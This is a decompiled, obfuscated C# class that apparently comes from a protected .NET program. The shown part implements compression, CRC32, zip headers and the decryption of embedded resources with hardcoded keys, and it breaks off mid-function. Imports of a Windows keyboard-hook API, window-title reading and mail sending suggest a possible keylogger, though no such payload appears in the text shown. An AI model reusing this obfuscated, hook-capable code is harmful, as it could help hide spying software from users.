using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Web.Services.Protocols;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using SmartAssembly.MemoryManagement;
using SmartAssembly.SmartExceptionsCore;
using ns1;
using ns2;
using ns3;
using ns4;
using ns5;
using ns6;
using ns7;
using ns8;

namespace ns0;

internal class Class42
{
	unsafe static bool smethod_0(string string_0)
	{
		void* ptr = stackalloc byte[22];
		*(int*)ptr = -1;
		byte* num = (byte*)ptr + 4;
		*(int*)((byte*)ptr + 12) = Class10.struct4_0.Length;
		*(int*)num = 0;
		while (*(int*)((byte*)ptr + 4) <= *(int*)((byte*)ptr + 12))
		{
			if (Class10.struct4_0[*(int*)((byte*)ptr + 4)].string_1.ToLower().CompareTo(string_0.ToLower()) != 0)
			{
				checked
				{
					(*unchecked((int*)((byte*)ptr + 4)))++;
					continue;
				}
			}
			*(int*)ptr = *(int*)((byte*)ptr + 4);
			break;
		}
		if (*(int*)ptr == -1)
		{
			((byte*)ptr)[20] = 0;
		}
		else
		{
			string[] array = Class10.struct4_0[*(int*)ptr].string_3.Substring(checked(Class10.struct4_0[*unchecked((int*)ptr)].string_3.IndexOf("(") + 1)).Split(new char[1] { ',' });
			byte* num2 = (byte*)ptr + 8;
			*(int*)((byte*)ptr + 16) = checked(array.Length - 1);
			*(int*)num2 = 0;
			while (*(int*)((byte*)ptr + 8) <= *(int*)((byte*)ptr + 16))
			{
				array[*(int*)((byte*)ptr + 8)] = Strings.LTrim(array[*(int*)((byte*)ptr + 8)]);
				object obj = array[*(int*)((byte*)ptr + 8)].IndexOf(" ");
				if (Operators.ConditionalCompareObjectGreater(obj, (object)0, false))
				{
					array[*(int*)((byte*)ptr + 8)] = array[*(int*)((byte*)ptr + 8)].Substring(0, Conversions.ToInteger(obj));
				}
				if (array[*(int*)((byte*)ptr + 8)].IndexOf(Class42.smethod_161("jaGntqx9Dw==", "False")) == 0)
				{
					break;
				}
				checked
				{
					Class10.string_0 = (string[])Utils.CopyArray((Array)Class10.string_0, (Array)new string[*unchecked((int*)((byte*)ptr + 8)) + 1]);
				}
				Class10.string_0[*(int*)((byte*)ptr + 8)] = array[*(int*)((byte*)ptr + 8)];
				checked
				{
					(*unchecked((int*)((byte*)ptr + 8)))++;
				}
			}
			((byte*)ptr)[20] = (Class42.smethod_62(checked((ulong)((Class10.struct4_0[*unchecked((int*)ptr)].long_1 - 1L) * unchecked((long)Class10.ushort_0)))) ? ((byte)1) : ((byte)0));
		}
		((byte*)ptr)[21] = ((byte*)ptr)[20];
		return ((byte*)ptr)[21] != 0;
	}

	static bool smethod_1()
	{
		return Class42.smethod_91().byte_0 == 1;
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int SetWindowsHookExA(int int_0, Class13.Delegate0 delegate0_0, int int_1, int int_2);

	static int smethod_2()
	{
		Version version = new Version("6.7.0.239");
		return version.Major;
	}

	unsafe static void smethod_3(Class30.Class37.Class38 class38_0, Class30.Class37.Class38 class38_1)
	{
		void* ptr = stackalloc byte[20];
		*(int*)((byte*)ptr + 8) = -1;
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < class38_1.int_1)
		{
			int num = 1;
			*(int*)((byte*)ptr + 16) = class38_1.byte_0[*(int*)((byte*)ptr + 12)];
			if (*(int*)((byte*)ptr + 16) == 0)
			{
				*(int*)ptr = 138;
				*(int*)((byte*)ptr + 4) = 3;
			}
			else
			{
				*(int*)ptr = 6;
				*(int*)((byte*)ptr + 4) = 3;
				if (*(int*)((byte*)ptr + 8) != *(int*)((byte*)ptr + 16))
				{
					short[] short_;
					short[] array = (short_ = class38_0.short_0);
					int num2 = *(int*)((byte*)ptr + 16);
					nint num3 = num2;
					array[num2] = (short)(short_[num3] + 1);
					num = 0;
				}
			}
			*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 16);
			(*(int*)((byte*)ptr + 12))++;
			while (*(int*)((byte*)ptr + 12) < class38_1.int_1 && *(int*)((byte*)ptr + 8) == class38_1.byte_0[*(int*)((byte*)ptr + 12)])
			{
				(*(int*)((byte*)ptr + 12))++;
				if (++num >= *(int*)ptr)
				{
					break;
				}
			}
			if (num < *(int*)((byte*)ptr + 4))
			{
				short[] short_;
				short[] array2 = (short_ = class38_0.short_0);
				int num4 = *(int*)((byte*)ptr + 8);
				nint num3 = num4;
				array2[num4] = (short)(short_[num3] + (short)num);
			}
			else if (*(int*)((byte*)ptr + 8) != 0)
			{
				short[] short_;
				(short_ = class38_0.short_0)[16] = (short)(short_[16] + 1);
			}
			else if (num <= 10)
			{
				short[] short_;
				(short_ = class38_0.short_0)[17] = (short)(short_[17] + 1);
			}
			else
			{
				short[] short_;
				(short_ = class38_0.short_0)[18] = (short)(short_[18] + 1);
			}
		}
	}

	[DllImport("user32.dll")]
	static extern int GetSystemMetrics(int int_0);

	static string smethod_4()
	{
		return "Software\\Red Gate\\" + Class42.smethod_35();
	}

	static void smethod_5(Class30.Class36 class36_0)
	{
		class36_0.int_0 |= 12;
	}

	unsafe static bool smethod_6(Assembly assembly_0, Assembly assembly_1)
	{
		void* ptr = stackalloc byte[5];
		byte[] publicKey = assembly_1.GetName().GetPublicKey();
		byte[] publicKey2 = assembly_0.GetName().GetPublicKey();
		if (publicKey2 == null != (publicKey == null))
		{
			((byte*)ptr)[4] = 0;
		}
		else
		{
			if (publicKey2 != null)
			{
				*(int*)ptr = 0;
				while (*(int*)ptr < publicKey2.Length)
				{
					if (publicKey2[*(int*)ptr] != publicKey[*(int*)ptr])
					{
						goto IL_0051;
					}
					(*(int*)ptr)++;
				}
			}
			((byte*)ptr)[4] = 1;
		}
		goto IL_005f;
		IL_0051:
		((byte*)ptr)[4] = 0;
		goto IL_005f;
		IL_005f:
		return ((byte*)ptr)[4] != 0;
	}

	unsafe static void smethod_7(Class30.Class37.Class38 class38_0, int[] int_0)
	{
		void* ptr = stackalloc byte[36];
		class38_0.byte_0 = new byte[class38_0.short_0.Length];
		*(int*)ptr = int_0.Length / 2;
		*(int*)((byte*)ptr + 4) = (*(int*)ptr + 1) / 2;
		*(int*)((byte*)ptr + 8) = 0;
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < class38_0.int_3)
		{
			class38_0.int_2[*(int*)((byte*)ptr + 12)] = 0;
			(*(int*)((byte*)ptr + 12))++;
		}
		int[] array = new int[*(int*)ptr];
		array[*(int*)ptr - 1] = 0;
		*(int*)((byte*)ptr + 16) = *(int*)ptr - 1;
		int[] int_;
		nint num2;
		while (*(int*)((byte*)ptr + 16) >= 0)
		{
			if (int_0[2 * *(int*)((byte*)ptr + 16) + 1] != -1)
			{
				*(int*)((byte*)ptr + 20) = array[*(int*)((byte*)ptr + 16)] + 1;
				if (*(int*)((byte*)ptr + 20) > class38_0.int_3)
				{
					*(int*)((byte*)ptr + 20) = class38_0.int_3;
					(*(int*)((byte*)ptr + 8))++;
				}
				array[int_0[2 * *(int*)((byte*)ptr + 16)]] = (array[int_0[2 * *(int*)((byte*)ptr + 16) + 1]] = *(int*)((byte*)ptr + 20));
			}
			else
			{
				*(int*)((byte*)ptr + 24) = array[*(int*)((byte*)ptr + 16)];
				int[] array2 = (int_ = class38_0.int_2);
				int num = *(int*)((byte*)ptr + 24) - 1;
				num2 = num;
				array2[num] = int_[num2] + 1;
				class38_0.byte_0[int_0[2 * *(int*)((byte*)ptr + 16)]] = (byte)array[*(int*)((byte*)ptr + 16)];
			}
			(*(int*)((byte*)ptr + 16))--;
		}
		if (*(int*)((byte*)ptr + 8) == 0)
		{
			return;
		}
		int num3 = class38_0.int_3 - 1;
		while (true)
		{
			if (class38_0.int_2[--num3] != 0)
			{
				do
				{
					int[] array3 = (int_ = class38_0.int_2);
					int num4 = num3;
					num2 = num4;
					array3[num4] = int_[num2] - 1;
					int[] array4 = (int_ = class38_0.int_2);
					int num5 = ++num3;
					num2 = num5;
					array4[num5] = int_[num2] + 1;
					*(int*)((byte*)ptr + 8) -= 1 << class38_0.int_3 - 1 - num3;
				}
				while (*(int*)((byte*)ptr + 8) > 0 && num3 < class38_0.int_3 - 1);
				if (*(int*)((byte*)ptr + 8) <= 0)
				{
					break;
				}
			}
		}
		int[] array5 = (int_ = class38_0.int_2);
		int num6 = class38_0.int_3 - 1;
		num2 = num6;
		array5[num6] = int_[num2] + *(int*)((byte*)ptr + 8);
		int[] array6 = (int_ = class38_0.int_2);
		int num7 = class38_0.int_3 - 2;
		num2 = num7;
		array6[num7] = int_[num2] - *(int*)((byte*)ptr + 8);
		int num8 = 2 * *(int*)((byte*)ptr + 4);
		*(int*)((byte*)ptr + 28) = class38_0.int_3;
		while (*(int*)((byte*)ptr + 28) != 0)
		{
			*(int*)((byte*)ptr + 32) = class38_0.int_2[*(int*)((byte*)ptr + 28) - 1];
			while (*(int*)((byte*)ptr + 32) > 0)
			{
				int num9 = 2 * int_0[num8++];
				if (int_0[num9 + 1] == -1)
				{
					class38_0.byte_0[int_0[num9]] = (byte)(*(uint*)((byte*)ptr + 28));
					(*(int*)((byte*)ptr + 32))--;
				}
			}
			(*(int*)((byte*)ptr + 28))--;
		}
	}

	unsafe static byte[] smethod_8(byte[] byte_0)
	{
		void* ptr = stackalloc byte[46];
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class42.smethod_6(callingAssembly, executingAssembly))
		{
			return null;
		}
		Class30.Stream0 stream = new Class30.Stream0(byte_0);
		byte[] array = new byte[0];
		*(int*)ptr = Class42.smethod_154(stream);
		if (*(int*)ptr == 67324752)
		{
			*(short*)((byte*)ptr + 44) = (short)Class42.smethod_80(stream);
			*(int*)((byte*)ptr + 4) = Class42.smethod_80(stream);
			*(int*)((byte*)ptr + 8) = Class42.smethod_80(stream);
			if (*(int*)ptr != 67324752 || *(short*)((byte*)ptr + 44) != 20 || *(int*)((byte*)ptr + 4) != 0 || *(int*)((byte*)ptr + 8) != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class42.smethod_154(stream);
			Class42.smethod_154(stream);
			Class42.smethod_154(stream);
			*(int*)((byte*)ptr + 12) = Class42.smethod_154(stream);
			*(int*)((byte*)ptr + 16) = Class42.smethod_80(stream);
			*(int*)((byte*)ptr + 20) = Class42.smethod_80(stream);
			if (*(int*)((byte*)ptr + 16) > 0)
			{
				byte[] buffer = new byte[*(int*)((byte*)ptr + 16)];
				stream.Read(buffer, 0, *(int*)((byte*)ptr + 16));
			}
			if (*(int*)((byte*)ptr + 20) > 0)
			{
				byte[] buffer2 = new byte[*(int*)((byte*)ptr + 20)];
				stream.Read(buffer2, 0, *(int*)((byte*)ptr + 20));
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class30.Class31 class31_ = new Class30.Class31(array2);
			array = new byte[*(int*)((byte*)ptr + 12)];
			Class42.smethod_90(array.Length, 0, class31_, array);
			array2 = null;
		}
		else
		{
			*(int*)((byte*)ptr + 24) = *(int*)ptr >> 24;
			*(int*)ptr -= *(int*)((byte*)ptr + 24) << 24;
			if (*(int*)ptr != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (*(int*)((byte*)ptr + 24) == 1)
			{
				*(int*)((byte*)ptr + 28) = Class42.smethod_154(stream);
				array = new byte[*(int*)((byte*)ptr + 28)];
				*(int*)((byte*)ptr + 32) = 0;
				while (*(int*)((byte*)ptr + 32) < *(int*)((byte*)ptr + 28))
				{
					*(int*)((byte*)ptr + 36) = Class42.smethod_154(stream);
					*(int*)((byte*)ptr + 40) = Class42.smethod_154(stream);
					byte[] array3 = new byte[*(int*)((byte*)ptr + 36)];
					stream.Read(array3, 0, array3.Length);
					Class30.Class31 class31_2 = new Class30.Class31(array3);
					Class42.smethod_90(*(int*)((byte*)ptr + 40), *(int*)((byte*)ptr + 32), class31_2, array);
					*(int*)((byte*)ptr + 32) += *(int*)((byte*)ptr + 40);
				}
			}
			if (*(int*)((byte*)ptr + 24) == 2)
			{
				byte[] byte_ = new byte[8] { 189, 65, 172, 123, 224, 47, 74, 162 };
				byte[] byte_2 = new byte[8] { 23, 241, 227, 32, 190, 23, 76, 117 };
				using Class29 class29_ = new Class29();
				using ICryptoTransform cryptoTransform = Class42.smethod_49(byte_, class29_, byte_2, bool_0: true);
				byte[] byte_3 = cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class42.smethod_8(byte_3);
			}
			if (*(int*)((byte*)ptr + 24) == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using Class28 class28_ = new Class28();
				using ICryptoTransform cryptoTransform2 = Class42.smethod_168(byte_4, bool_0: true, byte_5, class28_);
				byte[] byte_6 = cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class42.smethod_8(byte_6);
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	unsafe static ulong smethod_9(int int_0, int int_1)
	{
		void* ptr = stackalloc byte[32];
		if (int_1 > 8 || int_1 == 0)
		{
			*(long*)ptr = 0L;
		}
		else
		{
			*(long*)((byte*)ptr + 8) = 0L;
			byte* num = (byte*)ptr + 24;
			*(int*)((byte*)ptr + 28) = checked(int_1 - 1);
			*(int*)num = 0;
			while (*(int*)((byte*)ptr + 24) <= *(int*)((byte*)ptr + 28))
			{
				*(long*)((byte*)ptr + 8) = (*(long*)((byte*)ptr + 8) << 8) | Class10.byte_0[checked(int_0 + *unchecked((int*)((byte*)ptr + 24)))];
				checked
				{
					(*unchecked((int*)((byte*)ptr + 24)))++;
				}
			}
			*(long*)ptr = *(long*)((byte*)ptr + 8);
		}
		*(long*)((byte*)ptr + 16) = *(long*)ptr;
		return *(ulong*)((byte*)ptr + 16);
	}

	static void smethod_10(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6)
	{
		Class42.smethod_45(exception_0, new object[7] { object_0, object_1, object_2, object_3, object_4, object_5, object_6 });
	}

	static bool smethod_11()
	{
		try
		{
			Class54.Struct26 struct26_ = default(Class54.Struct26);
			Class42.GetSystemInfo(ref struct26_);
			return struct26_.ushort_0 == 9;
		}
		catch
		{
			return false;
		}
	}

	static bool smethod_12(int int_0, Class30.Class37 class37_0)
	{
		class37_0.short_0[class37_0.int_1] = 0;
		class37_0.byte_1[class37_0.int_1++] = (byte)int_0;
		short[] short_;
		short[] array = (short_ = class37_0.class38_0.short_0);
		nint num = int_0;
		array[int_0] = (short)(short_[num] + 1);
		return Class42.smethod_111(class37_0);
	}

	static void smethod_13(Class29 class29_0)
	{
		class29_0.type_0.GetMethod("Clear")!.Invoke(class29_0.object_0, new object[0]);
	}

	static object smethod_14(Class49 class49_0)
	{
		return class49_0.object_0;
	}

	unsafe static byte[] smethod_15(byte[] byte_0, byte[] byte_1, int int_0, byte[] byte_2)
	{
		void* ptr = stackalloc byte[64];
		try
		{
			Class30.Stream0 stream = new Class30.Stream0();
			switch (int_0)
			{
			case 0:
			{
				Class30.Class36 class36_2 = new Class30.Class36();
				DateTime now = DateTime.Now;
				*(long*)ptr = (uint)((((now.Year - 1980) & 0x7F) << 25) | (now.Month << 21) | (now.Day << 16) | (now.Hour << 11) | (now.Minute << 5) | (int)((uint)now.Second >> 1));
				uint[] array8 = new uint[256]
				{
					0u, 1996959894u, 3993919788u, 2567524794u, 124634137u, 1886057615u, 3915621685u, 2657392035u, 249268274u, 2044508324u,
					3772115230u, 2547177864u, 162941995u, 2125561021u, 3887607047u, 2428444049u, 498536548u, 1789927666u, 4089016648u, 2227061214u,
					450548861u, 1843258603u, 4107580753u, 2211677639u, 325883990u, 1684777152u, 4251122042u, 2321926636u, 335633487u, 1661365465u,
					4195302755u, 2366115317u, 997073096u, 1281953886u, 3579855332u, 2724688242u, 1006888145u, 1258607687u, 3524101629u, 2768942443u,
					901097722u, 1119000684u, 3686517206u, 2898065728u, 853044451u, 1172266101u, 3705015759u, 2882616665u, 651767980u, 1373503546u,
					3369554304u, 3218104598u, 565507253u, 1454621731u, 3485111705u, 3099436303u, 671266974u, 1594198024u, 3322730930u, 2970347812u,
					795835527u, 1483230225u, 3244367275u, 3060149565u, 1994146192u, 31158534u, 2563907772u, 4023717930u, 1907459465u, 112637215u,
					2680153253u, 3904427059u, 2013776290u, 251722036u, 2517215374u, 3775830040u, 2137656763u, 141376813u, 2439277719u, 3865271297u,
					1802195444u, 476864866u, 2238001368u, 4066508878u, 1812370925u, 453092731u, 2181625025u, 4111451223u, 1706088902u, 314042704u,
					2344532202u, 4240017532u, 1658658271u, 366619977u, 2362670323u, 4224994405u, 1303535960u, 984961486u, 2747007092u, 3569037538u,
					1256170817u, 1037604311u, 2765210733u, 3554079995u, 1131014506u, 879679996u, 2909243462u, 3663771856u, 1141124467u, 855842277u,
					2852801631u, 3708648649u, 1342533948u, 654459306u, 3188396048u, 3373015174u, 1466479909u, 544179635u, 3110523913u, 3462522015u,
					1591671054u, 702138776u, 2966460450u, 3352799412u, 1504918807u, 783551873u, 3082640443u, 3233442989u, 3988292384u, 2596254646u,
					62317068u, 1957810842u, 3939845945u, 2647816111u, 81470997u, 1943803523u, 3814918930u, 2489596804u, 225274430u, 2053790376u,
					3826175755u, 2466906013u, 167816743u, 2097651377u, 4027552580u, 2265490386u, 503444072u, 1762050814u, 4150417245u, 2154129355u,
					426522225u, 1852507879u, 4275313526u, 2312317920u, 282753626u, 1742555852u, 4189708143u, 2394877945u, 397917763u, 1622183637u,
					3604390888u, 2714866558u, 953729732u, 1340076626u, 3518719985u, 2797360999u, 1068828381u, 1219638859u, 3624741850u, 2936675148u,
					906185462u, 1090812512u, 3747672003u, 2825379669u, 829329135u, 1181335161u, 3412177804u, 3160834842u, 628085408u, 1382605366u,
					3423369109u, 3138078467u, 570562233u, 1426400815u, 3317316542u, 2998733608u, 733239954u, 1555261956u, 3268935591u, 3050360625u,
					752459403u, 1541320221u, 2607071920u, 3965973030u, 1969922972u, 40735498u, 2617837225u, 3943577151u, 1913087877u, 83908371u,
					2512341634u, 3803740692u, 2075208622u, 213261112u, 2463272603u, 3855990285u, 2094854071u, 198958881u, 2262029012u, 4057260610u,
					1759359992u, 534414190u, 2176718541u, 4139329115u, 1873836001u, 414664567u, 2282248934u, 4279200368u, 1711684554u, 285281116u,
					2405801727u, 4167216745u, 1634467795u, 376229701u, 2685067896u, 3608007406u, 1308918612u, 956543938u, 2808555105u, 3495958263u,
					1231636301u, 1047427035u, 2932959818u, 3654703836u, 1088359270u, 936918000u, 2847714899u, 3736837829u, 1202900863u, 817233897u,
					3183342108u, 3401237130u, 1404277552u, 615818150u, 3134207493u, 3453421203u, 1423857449u, 601450431u, 3009837614u, 3294710456u,
					1567103746u, 711928724u, 3020668471u, 3272380065u, 1510334235u, 755167117u
				};
				*(int*)((byte*)ptr + 40) = -1;
				uint num = *(uint*)((byte*)ptr + 40);
				int num2 = 0;
				int num3 = byte_2.Length;
				while (--num3 >= 0)
				{
					num = array8[(num ^ byte_2[num2++]) & 0xFF] ^ (num >> 8);
				}
				num ^= *(uint*)((byte*)ptr + 40);
				Class42.smethod_123(67324752, stream);
				Class42.smethod_37(20, stream);
				Class42.smethod_37(0, stream);
				Class42.smethod_37(8, stream);
				Class42.smethod_123((int)(*(long*)ptr), stream);
				Class42.smethod_123((int)num, stream);
				*(long*)((byte*)ptr + 8) = stream.Position;
				Class42.smethod_123(0, stream);
				Class42.smethod_123(byte_2.Length, stream);
				byte[] bytes = Encoding.UTF8.GetBytes("{data}");
				Class42.smethod_37(bytes.Length, stream);
				Class42.smethod_37(0, stream);
				stream.Write(bytes, 0, bytes.Length);
				Class42.smethod_41(class36_2, byte_2);
				while (!Class42.smethod_86(class36_2))
				{
					byte[] array9 = new byte[512];
					*(int*)((byte*)ptr + 44) = Class42.smethod_18(array9, class36_2);
					if (*(int*)((byte*)ptr + 44) <= 0)
					{
						break;
					}
					stream.Write(array9, 0, *(int*)((byte*)ptr + 44));
				}
				Class42.smethod_5(class36_2);
				while (!Class42.smethod_73(class36_2))
				{
					byte[] array10 = new byte[512];
					*(int*)((byte*)ptr + 48) = Class42.smethod_18(array10, class36_2);
					if (*(int*)((byte*)ptr + 48) <= 0)
					{
						break;
					}
					stream.Write(array10, 0, *(int*)((byte*)ptr + 48));
				}
				*(long*)((byte*)ptr + 16) = Class42.smethod_99(class36_2);
				Class42.smethod_123(33639248, stream);
				Class42.smethod_37(20, stream);
				Class42.smethod_37(20, stream);
				Class42.smethod_37(0, stream);
				Class42.smethod_37(8, stream);
				Class42.smethod_123((int)(*(long*)ptr), stream);
				Class42.smethod_123((int)num, stream);
				Class42.smethod_123((int)(*(long*)((byte*)ptr + 16)), stream);
				Class42.smethod_123(byte_2.Length, stream);
				Class42.smethod_37(bytes.Length, stream);
				Class42.smethod_37(0, stream);
				Class42.smethod_37(0, stream);
				Class42.smethod_37(0, stream);
				Class42.smethod_37(0, stream);
				Class42.smethod_123(0, stream);
				Class42.smethod_123(0, stream);
				stream.Write(bytes, 0, bytes.Length);
				Class42.smethod_123(101010256, stream);
				Class42.smethod_37(0, stream);
				Class42.smethod_37(0, stream);
				Class42.smethod_37(1, stream);
				Class42.smethod_37(1, stream);
				Class42.smethod_123(46 + bytes.Length, stream);
				Class42.smethod_123((int)(30 + bytes.Length + *(long*)((byte*)ptr + 16)), stream);
				Class42.smethod_37(0, stream);
				stream.Seek(*(long*)((byte*)ptr + 8), SeekOrigin.Begin);
				Class42.smethod_123((int)(*(long*)((byte*)ptr + 16)), stream);
				break;
			}
			case 1:
				Class42.smethod_123(25000571, stream);
				Class42.smethod_123(byte_2.Length, stream);
				*(int*)((byte*)ptr + 52) = 0;
				while (*(int*)((byte*)ptr + 52) < byte_2.Length)
				{
					byte[] array5 = new byte[Math.Min(2097151, byte_2.Length - *(int*)((byte*)ptr + 52))];
					Buffer.BlockCopy(byte_2, *(int*)((byte*)ptr + 52), array5, 0, array5.Length);
					*(long*)((byte*)ptr + 24) = stream.Position;
					Class42.smethod_123(0, stream);
					Class42.smethod_123(array5.Length, stream);
					Class30.Class36 class36_ = new Class30.Class36();
					Class42.smethod_41(class36_, array5);
					while (!Class42.smethod_86(class36_))
					{
						byte[] array6 = new byte[512];
						*(int*)((byte*)ptr + 56) = Class42.smethod_18(array6, class36_);
						if (*(int*)((byte*)ptr + 56) <= 0)
						{
							break;
						}
						stream.Write(array6, 0, *(int*)((byte*)ptr + 56));
					}
					Class42.smethod_5(class36_);
					while (!Class42.smethod_73(class36_))
					{
						byte[] array7 = new byte[512];
						*(int*)((byte*)ptr + 60) = Class42.smethod_18(array7, class36_);
						if (*(int*)((byte*)ptr + 60) <= 0)
						{
							break;
						}
						stream.Write(array7, 0, *(int*)((byte*)ptr + 60));
					}
					*(long*)((byte*)ptr + 32) = stream.Position;
					stream.Position = *(long*)((byte*)ptr + 24);
					Class42.smethod_123((int)Class42.smethod_99(class36_), stream);
					stream.Position = *(long*)((byte*)ptr + 32);
					*(int*)((byte*)ptr + 52) += array5.Length;
				}
				break;
			case 2:
			{
				Class42.smethod_123(41777787, stream);
				byte[] array3 = Class42.smethod_15((byte[])null, (byte[])null, 1, byte_2);
				using (Class29 class29_ = new Class29())
				{
					using ICryptoTransform cryptoTransform2 = Class42.smethod_49(byte_1, class29_, byte_0, bool_0: false);
					byte[] array4 = cryptoTransform2.TransformFinalBlock(array3, 0, array3.Length);
					stream.Write(array4, 0, array4.Length);
				}
				break;
			}
			case 3:
			{
				Class42.smethod_123(58555003, stream);
				byte[] array = Class42.smethod_15((byte[])null, (byte[])null, 1, byte_2);
				using (Class28 class28_ = new Class28())
				{
					using ICryptoTransform cryptoTransform = Class42.smethod_168(byte_1, bool_0: false, byte_0, class28_);
					byte[] array2 = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
					stream.Write(array2, 0, array2.Length);
				}
				break;
			}
			}
			stream.Flush();
			stream.Close();
			return stream.ToArray();
		}
		catch (Exception ex)
		{
			Class30.string_0 = "ERR 2003: " + ex.Message;
			throw;
		}
	}

	static string smethod_16()
	{
		return "Software\\Wow6432Node\\Red Gate\\" + Class42.smethod_35();
	}

	static string smethod_17(string string_0)
	{
		string result = default(string);
		try
		{
			StreamReader streamReader = new StreamReader(string_0);
			result = streamReader.ReadToEnd().ToString();
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	unsafe static int smethod_18(byte[] byte_0, Class30.Class36 class36_0)
	{
		void* ptr = stackalloc byte[26];
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = byte_0.Length;
		*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 4);
		while (true)
		{
			*(int*)((byte*)ptr + 12) = Class42.smethod_46(class36_0.class40_0, byte_0, *(int*)ptr, *(int*)((byte*)ptr + 4));
			*(int*)ptr += *(int*)((byte*)ptr + 12);
			class36_0.long_0 += *(int*)((byte*)ptr + 12);
			*(int*)((byte*)ptr + 4) -= *(int*)((byte*)ptr + 12);
			if (*(int*)((byte*)ptr + 4) != 0 && class36_0.int_0 != 30)
			{
				Class30.Class39 class39_ = class36_0.class39_0;
				((byte*)ptr)[24] = (((class36_0.int_0 & 4) != 0) ? ((byte)1) : ((byte)0));
				((byte*)ptr)[25] = (((class36_0.int_0 & 8) != 0) ? ((byte)1) : ((byte)0));
				if (Class42.smethod_116(((byte*)ptr)[24] != 0, ((byte*)ptr)[25] != 0, class39_))
				{
					continue;
				}
				if (class36_0.int_0 != 16)
				{
					if (class36_0.int_0 == 20)
					{
						*(int*)((byte*)ptr + 16) = 8 + (-Class42.smethod_100(class36_0.class40_0) & 7);
						while (*(int*)((byte*)ptr + 16) > 0)
						{
							Class42.smethod_167(class36_0.class40_0, 2, 10);
							*(int*)((byte*)ptr + 16) -= 10;
						}
						class36_0.int_0 = 16;
					}
					else if (class36_0.int_0 == 28)
					{
						Class42.smethod_165(class36_0.class40_0);
						class36_0.int_0 = 30;
					}
					continue;
				}
				*(int*)((byte*)ptr + 20) = *(int*)((byte*)ptr + 8) - *(int*)((byte*)ptr + 4);
				break;
			}
			*(int*)((byte*)ptr + 20) = *(int*)((byte*)ptr + 8) - *(int*)((byte*)ptr + 4);
			break;
		}
		return *(int*)((byte*)ptr + 20);
	}

	static bool smethod_19(EventArgs2 eventArgs2_0)
	{
		return eventArgs2_0.bool_0;
	}

	static void smethod_20(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7)
	{
		Class42.smethod_45(exception_0, new object[8] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7 });
	}

	static void smethod_21(byte[] byte_0, int int_0, int int_1, Class30.Class32 class32_0)
	{
		if (class32_0.int_0 < class32_0.int_1)
		{
			throw new InvalidOperationException();
		}
		int num = int_0 + int_1;
		if (0 <= int_0 && int_0 <= num && num <= byte_0.Length)
		{
			if (((uint)int_1 & (true ? 1u : 0u)) != 0)
			{
				class32_0.uint_0 |= (uint)((byte_0[int_0++] & 0xFF) << class32_0.int_2);
				class32_0.int_2 += 8;
			}
			class32_0.byte_0 = byte_0;
			class32_0.int_0 = int_0;
			class32_0.int_1 = num;
			return;
		}
		throw new ArgumentOutOfRangeException();
	}

	static string smethod_22(IntPtr intptr_0)
	{
		string result = default(string);
		try
		{
			if (intptr_0.ToInt32() <= 0)
			{
				result = null;
				return result;
			}
			int windowTextLength = Class42.GetWindowTextLength(intptr_0);
			if (windowTextLength == 0)
			{
				result = null;
				return result;
			}
			StringBuilder stringBuilder = new StringBuilder(checked(windowTextLength + 1));
			Class42.GetWindowTextA((int)intptr_0, stringBuilder, stringBuilder.Capacity);
			result = stringBuilder.ToString().Trim();
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	static void smethod_23(Class30.Class33 class33_0, int int_0, int int_1, int int_2)
	{
		while (int_1-- > 0)
		{
			class33_0.byte_0[class33_0.int_0++] = class33_0.byte_0[int_0++];
			class33_0.int_0 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	unsafe static bool smethod_24(int int_0, Class30.Class39 class39_0)
	{
		void* ptr = stackalloc byte[23];
		int num = 128;
		*(int*)ptr = 128;
		short[] short_ = class39_0.short_1;
		int int_ = class39_0.int_4;
		*(int*)((byte*)ptr + 4) = class39_0.int_4 + class39_0.int_2;
		*(int*)((byte*)ptr + 8) = Math.Max(class39_0.int_2, 2);
		*(int*)((byte*)ptr + 12) = Math.Max(class39_0.int_4 - 32506, 0);
		*(int*)((byte*)ptr + 16) = class39_0.int_4 + 258 - 1;
		((byte*)ptr)[20] = class39_0.byte_0[*(int*)((byte*)ptr + 4) - 1];
		((byte*)ptr)[21] = class39_0.byte_0[*(int*)((byte*)ptr + 4)];
		if (*(int*)((byte*)ptr + 8) >= 8)
		{
			num >>= 2;
		}
		if (*(int*)ptr > class39_0.int_5)
		{
			*(int*)ptr = class39_0.int_5;
		}
		do
		{
